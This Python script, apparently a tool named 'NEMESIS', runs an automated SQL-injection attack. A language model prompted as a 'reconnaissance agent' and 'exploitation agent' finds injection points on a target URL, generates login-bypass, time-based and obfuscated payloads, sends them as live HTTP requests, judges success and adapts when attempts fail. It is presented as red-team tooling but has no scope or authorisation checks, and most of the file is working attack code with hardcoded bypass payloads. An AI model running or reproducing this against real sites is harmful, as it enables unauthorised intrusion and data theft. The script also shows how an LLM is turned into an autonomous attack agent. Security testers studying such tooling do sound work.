import os
import json
import requests
import time
from bs4 import BeautifulSoup
from openai import OpenAI
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

# ---------- CONFIG ----------
GROQ_API_KEY = os.getenv("GROQ_API_KEY") or "your-groq-key"
client = OpenAI(base_url="https://api.groq.com/openai/v1", api_key=GROQ_API_KEY)

# ---------- LOGGING ----------
def log(msg):
    print(f"[NEMESIS] {msg}")

# ---------- 1. RECON: LLM decides what to test ----------
def llm_recon(target_url: str) -> list:
    """
    The LLM decides which endpoints, forms, and parameters to test.
    It returns a list of injection points.
    """
    log("🔍 LLM Recon: Analyzing target...")
    
    # First, fetch the page to give the LLM context
    try:
        resp = requests.get(target_url, timeout=10, allow_redirects=False)
        html_snippet = resp.text[:3000]
        status_code = resp.status_code
    except Exception as e:
        html_snippet = f"Error fetching page: {e}"
        status_code = 0

    prompt = f"""
You are a reconnaissance agent. Analyze this target and identify all potential injection points.

Target URL: {target_url}
Status code: {status_code}
Page snippet (first 3000 chars):
{html_snippet}

Identify:
1. All forms (method, action, input fields)
2. All URL parameters (GET)
3. All potential endpoints (login, search, API, etc.)

Return ONLY a JSON array of injection points, each with:
{{
    "method": "GET" or "POST",
    "url": "full_url",
    "fields": {{"field1": "", "field2": ""}} or null for GET,
    "param": "param_name" or null for POST
}}

Example: [{{"method":"POST","url":"https://vulnbank.org/login","fields":{{"username":"","password":""}},"param":null}}]
"""
    try:
        response = client.chat.completions.create(
            model="llama-3.1-8b-instant",
            messages=[
                {"role": "system", "content": "You are a reconnaissance agent. Return only valid JSON."},
                {"role": "user", "content": prompt}
            ],
            temperature=0.3
        )
        raw = response.choices[0].message.content.strip()
        start = raw.find('[')
        end = raw.rfind(']') + 1
        if start != -1 and end != 0:
            points = json.loads(raw[start:end])
            log(f"🔍 LLM Recon found {len(points)} injection points")
            return points
        else:
            log("⚠️ LLM Recon returned no valid JSON, using fallback")
            return [{"method": "POST", "url": target_url, "fields": {"username": "", "password": ""}, "param": None}]
    except Exception as e:
        log(f"⚠️ LLM Recon error: {e}, using fallback")
        return [{"method": "POST", "url": target_url, "fields": {"username": "", "password": ""}, "param": None}]

# ---------- 2. EXPLOIT: LLM decides payloads ----------
def llm_generate_payloads(target_url: str, vuln_type: str, point: dict) -> list:
    """
    The LLM generates payloads specifically for this injection point.
    """
    log(f"💉 LLM Generating payloads for {point['url']}...")
    
    prompt = f"""
You are an exploitation agent. Generate SQL injection payloads for this target.

Target: {target_url}
Injection point: {json.dumps(point, indent=2)}
Vulnerability type: {vuln_type}

Requirements:
- Generate 5-8 unique payloads.
- Include login bypass payloads if this is a login form.
- Include error-based, boolean-based, and time-based payloads.
- Include obfuscation techniques.

Return ONLY a JSON array of strings.
Example: ["admin' --", "' OR '1'='1' --", "' AND SLEEP(5) --"]
"""
    try:
        response = client.chat.completions.create(
            model="llama-3.1-8b-instant",
            messages=[
                {"role": "system", "content": "You are an exploitation agent. Return only valid JSON."},
                {"role": "user", "content": prompt}
            ],
            temperature=0.7
        )
        raw = response.choices[0].message.content.strip()
        start = raw.find('[')
        end = raw.rfind(']') + 1
        if start != -1 and end != 0:
            payloads = json.loads(raw[start:end])
            log(f"💉 Generated {len(payloads)} payloads")
            return payloads
        else:
            return ["' OR '1'='1' --", "admin' --", "' OR 1=1 --"]
    except Exception as e:
        log(f"⚠️ Payload generation error: {e}")
        return ["' OR '1'='1' --", "admin' --", "' OR 1=1 --"]

# ---------- 3. SEND REQUEST ----------
def send_request(point: dict, payload: str) -> dict:
    """
    Sends a real HTTP request with the payload.
    """
    method = point.get("method", "POST").upper()
    url = point.get("url")
    fields = point.get("fields")
    param = point.get("param")

    try:
        if method == "GET" and param:
            parsed = urlparse(url)
            query_dict = parse_qs(parsed.query)
            query_dict[param] = payload
            new_query = urlencode(query_dict, doseq=True)
            new_url = urlunparse(parsed._replace(query=new_query))
            start = time.time()
            resp = requests.get(new_url, timeout=10, allow_redirects=False)
            elapsed = time.time() - start
            return {"status_code": resp.status_code, "body": resp.text[:2000], "time": elapsed, "error": None}
        elif method == "POST" and fields:
            # Inject into the first field
            data = fields.copy()
            for key in data.keys():
                data[key] = payload
                break
            start = time.time()
            resp = requests.post(url, data=data, timeout=10, allow_redirects=False)
            elapsed = time.time() - start
            return {"status_code": resp.status_code, "body": resp.text[:2000], "time": elapsed, "error": None}
        else:
            start = time.time()
            resp = requests.get(f"{url}?q={payload}", timeout=10, allow_redirects=False)
            elapsed = time.time() - start
            return {"status_code": resp.status_code, "body": resp.text[:2000], "time": elapsed, "error": None}
    except Exception as e:
        return {"status_code": 0, "body": "", "time": 0, "error": str(e)}

# ---------- 4. ANALYZE: LLM decides if it worked ----------
def llm_analyze_response(payload: str, response: dict, vuln_type: str) -> dict:
    """
    The LLM analyzes the response and decides if the vulnerability exists.
    """
    log(f"🧠 LLM Analyzing response for payload: {payload[:30]}...")
    
    prompt = f"""
You are a security analyst. Determine if this HTTP response indicates a successful {vuln_type} exploit.

Payload sent: {payload}
Status code: {response['status_code']}
Response time: {response['time']:.2f} seconds
Response body (truncated):
{response['body'][:1500]}

Indicators of success:
- A redirect (302/303) to a dashboard or admin page.
- A different response body (not "Login failed" or error).
- SQL error messages.
- Time delay > 4 seconds (for time-based attacks).

Return a JSON object:
{{
    "success": true/false,
    "reason": "Your reasoning",
    "confidence": "high/medium/low",
    "evidence": "specific evidence from the response"
}}
"""
    try:
        resp = client.chat.completions.create(
            model="llama-3.1-8b-instant",
            messages=[
                {"role": "system", "content": "You are a security analyst. Return only valid JSON."},
                {"role": "user", "content": prompt}
            ],
            temperature=0.0
        )
        raw = resp.choices[0].message.content.strip()
        start = raw.find('{')
        end = raw.rfind('}') + 1
        if start != -1 and end != 0:
            result = json.loads(raw[start:end])
            log(f"🧠 LLM verdict: {result.get('success')} - {result.get('reason', '')[:50]}")
            return result
        else:
            return {"success": False, "reason": "Failed to parse response", "confidence": "low", "evidence": ""}
    except Exception as e:
        log(f"⚠️ Analysis error: {e}")
        return {"success": False, "reason": str(e), "confidence": "low", "evidence": ""}

# ---------- 5. ADAPT: LLM tries again if it fails ----------
def llm_adapt(payloads: list, responses: list, vuln_type: str) -> list:
    """
    If no payload worked, the LLM suggests new payloads to try.
    """
    log("🔄 LLM Adapting strategy...")
    
    prompt = f"""
You are an exploitation agent. Your previous payloads didn't work.

Previous payloads and their responses:
{json.dumps(responses, indent=2)[:1500]}

Vulnerability type: {vuln_type}

Suggest 3-5 NEW payloads that might work. Try different techniques:
- Different obfuscation.
- Different injection points.
- Different syntax (MySQL, PostgreSQL, MSSQL).
- Different techniques (Union, Boolean, Time-based).

Return ONLY a JSON array of strings.
"""
    try:
        resp = client.chat.completions.create(
            model="llama-3.1-8b-instant",
            messages=[
                {"role": "system", "content": "You are an exploitation agent. Return only valid JSON."},
                {"role": "user", "content": prompt}
            ],
            temperature=0.8
        )
        raw = resp.choices[0].message.content.strip()
        start = raw.find('[')
        end = raw.rfind(']') + 1
        if start != -1 and end != 0:
            return json.loads(raw[start:end])
        else:
            return []
    except Exception as e:
        log(f"⚠️ Adaptation error: {e}")
        return []

# ---------- 6. MAIN ORCHESTRATOR ----------
def generate_threat_analysis(target_url: str, vuln_type: str) -> str:
    """
    Full red team loop:
    1. Recon (LLM)
    2. Exploit (LLM generates payloads)
    3. Analyze (LLM)
    4. Adapt if needed (LLM)
    5. Report (LLM)
    """
    log("🚀 Starting autonomous red team assessment...")
    
    # Phase 1: Recon
    points = llm_recon(target_url)
    if not points:
        return "❌ No injection points found. Target may not be vulnerable."
    
    all_results = []
    any_success = False
    
    # Phase 2: Exploit & Analyze
    for point in points:
        log(f"🎯 Testing: {point['url']}")
        
        # Generate payloads
        payloads = llm_generate_payloads(target_url, vuln_type, point)
        
        # Try each payload
        responses = []
        for payload in payloads:
            response = send_request(point, payload)
            analysis = llm_analyze_response(payload, response, vuln_type)
            
            responses.append({
                "payload": payload,
                "status": response["status_code"],
                "snippet": response["body"][:200],
                "verdict": analysis
            })
            
            if analysis.get("success") and analysis.get("confidence") in ("high", "medium"):
                any_success = True
                all_results.append({
                    "point": point,
                    "payload": payload,
                    "response": response,
                    "analysis": analysis
                })
                log("✅ Vulnerability confirmed!")
                break
        
        # Phase 3: Adapt if needed
        if not any_success:
            log("🔄 No success yet, trying adaptation...")
            new_payloads = llm_adapt(payloads, responses, vuln_type)
            for payload in new_payloads:
                response = send_request(point, payload)
                analysis = llm_analyze_response(payload, response, vuln_type)
                if analysis.get("success") and analysis.get("confidence") in ("high", "medium"):
                    any_success = True
                    all_results.append({
                        "point": point,
                        "payload": payload,
                        "response": response,
                        "analysis": analysis
                    })
                    log("✅ Vulnerability confirmed after adaptation!")
                    break
    
    # Phase 4: Report
    log("📝 Generating final report...")
    
    if any_success:
        prompt = f"""
You are a senior security consultant. Write a professional red team report.

Target: {target_url}
Vulnerability: {vuln_type}

Successful exploits:
{json.dumps(all_results, indent=2)}

Include:
1. Executive summary
2. Attack vector explanation
3. Successful payloads (with evidence)
4. Impact assessment
5. Remediation steps

Write in plain text, no markdown.
"""
        try:
            resp = client.chat.completions.create(
                model="llama-3.1-8b-instant",
                messages=[
                    {"role": "system", "content": "You are a senior security consultant."},
                    {"role": "user", "content": prompt}
                ],
                temperature=0.3
            )
            report = resp.choices[0].message.content.strip()
        except Exception as e:
            report = f"✅ Exploit successful but report generation failed: {e}"
    else:
        report = f"""❌ No vulnerabilities found for {vuln_type} on {target_url}.

Injection points tested: {len(points)}
Payloads tested: {sum(len(r.get('payloads', [])) for r in responses if 'responses' in locals())}
Status: The target appears secure against this attack vector.

Recommendation: Consider manual testing for more complex vulnerabilities."""

    global _last_exploit_success
    _last_exploit_success = any_success
    return report

_last_exploit_success = False
def get_last_exploit_success():
    return _last_exploit_success